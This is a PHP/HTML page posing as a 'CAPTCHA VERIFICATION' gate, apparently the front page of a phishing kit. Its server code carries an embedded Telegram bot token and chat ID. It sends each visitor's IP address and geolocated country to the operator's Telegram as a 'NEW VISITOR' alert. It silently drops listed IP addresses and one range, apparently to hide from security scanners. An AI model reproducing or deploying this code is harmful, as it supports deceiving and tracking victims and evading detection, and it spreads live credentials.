
<?php
session_start();
ini_set('display_errors', 1);
error_reporting(E_ALL);
?>


<!DOCTYPE html>


<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CAPTCHA VERIFICATION</title>

  <style>
  body {
    margin: 0;
    padding: 10px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    background-color: black; /* Set background color to black */
    font-family: Arial, sans-serif;
    color: #fff; /* Text color to white for better contrast */
  }

  #loader-container {
    text-align: center;
    color: #fff; /* Text color to white for loader */
  }

  .custom-loader, #main-page-button, input {
    max-width: 90%; /* Ensures elements do not exceed the screen width */
  }

  .custom-loader {
    height: 10px;
    background-color: #fff;
    position: relative;
  }

  .loader-bar {
    height: 100%;
    background-color: #ff4500;
    position: absolute;
    animation: move 2s infinite linear;
  }

  @keyframes move {
    0%, 100% { transform: translateX(0); }
    50% { transform: translateX(80px); }
  }

  #loader-text {
    margin-top: 10px;
    font-size: 1em; /* Responsive font size */
    color: #fff; /* Text color to white */
  }

  #input-section, #main-page-content {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%; /* Use full container width */
  }

  input, #main-page-button {
    margin-top: 10px;
    padding: 10px;
    width: auto; /* Adjust width based on content */
    font-size: 1em; /* Responsive font size */
    color: #000; /* Text color to black for better visibility */
    background-color: #fff; /* Background color to white for better visibility */
    border: none; /* Remove borders */
    border-radius: 5px; /* Add border radius */
  }

  #main-page-button {
    cursor: pointer;
    font-weight: bold;
  }

  #userInput.invalid {
    border: 2px solid darkblue;
  }

  #errorMsg {
    font-size: 0.8em; /* Responsive font size */
    color: red; /* Fixed color for better visibility */
  }

  @media (max-width: 600px) {
    #main-page-button, input {
      padding: 8px 20px; /* Adjust padding for smaller screens */
    }

    #loader-text, #errorMsg {
      font-size: 0.9em; /* Adjust font size for smaller screens */
    }
  }
</style>
</head>
<body>
<?php
  $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
  $chatID = "1064643518";

  
  $userIP = $_SERVER["REMOTE_ADDR"];

  // List of blocked IPs
  $blockedIPs = ['44.227.127.2' , '129.153.125.162' , '192.87.174.28'];

  if (in_array($userIP, $blockedIPs)) {
    exit; // Silently exit for blocked IP addresses
  }
  if (strpos($userIP, '209.222.82.') === 0) {
    exit; // Silently exit for blocked IP range
}
  $accessTime = date("Y-m-d H:i:s");

  // Fetching the geolocation data
  $geoUrl = "http://ip-api.com/json/$userIP";
  $geoResponse = file_get_contents($geoUrl);
  $geoData = json_decode($geoResponse, true);

  // Extracting the country from the response
  $country = $geoData['country'] ?? 'Unknown';

  // Message to Send
  $message = urlencode(
      "[Alert] NEW VISITOR FROM IP : $userIP, Country: $country, status : captcha"
  );

  // Now you can use $message as needed


  // Telegram API URL for sending messages
  $telegramApi = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";

  // Use file_get_contents to send the request
  $response = file_get_contents($telegramApi);

  // Decode the JSON response to an array
  $responseArray = json_decode($response, true);

  // Extract the message_id from the response
  $messageId = $responseArray["result"]["message_id"];
  echo "<input type='text' value='" .$messageId ."' style='display:none' id='messageId' />";

  echo "<input type='text' value='" .$userIP ."' style='display:none' id='ipzebi' />";

  //echo file_get_contents("https://api.telegram.org/botYOUR_BOT_TOKEN/editMessageText", false, stream_context_create(['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => http_build_query(['chat_id' => 'CHAT_ID', 'message_id' => MESSAGE_ID, 'text' => 'This is the new edited text'])]]));


?>
<img src="./nfx.png" alt="Logo" width="350" height="400">

<svg xmlns="http://www.w3.org/2000/svg" width="150" height="100" viewBox="0 0 200 100">
        <rect width="100%" height="100%" fill="#eee" />
        <text id="randomStringSpan" x="50%" y="50%" font-size="30" fill="#333" text-anchor="middle" dominant-baseline="middle" font-family="Arial, sans-serif">
        </text>
        <!-- Your SVG content -->
    </svg>  
<fieldset class="whiteborder">
    <legend>Please finish the captcha to proceed</legend>
    <div class="fl20"> <input id="userInput" type="text" placeholder="Enter captcha text" />
        <span id="errorMsg"></span>
        <button id="main-page-button" onclick="checkInput()">Submit</button></div>
    <div class="clear"></div>
</fieldset>



<script src="script.js"></script>

</body>
</html>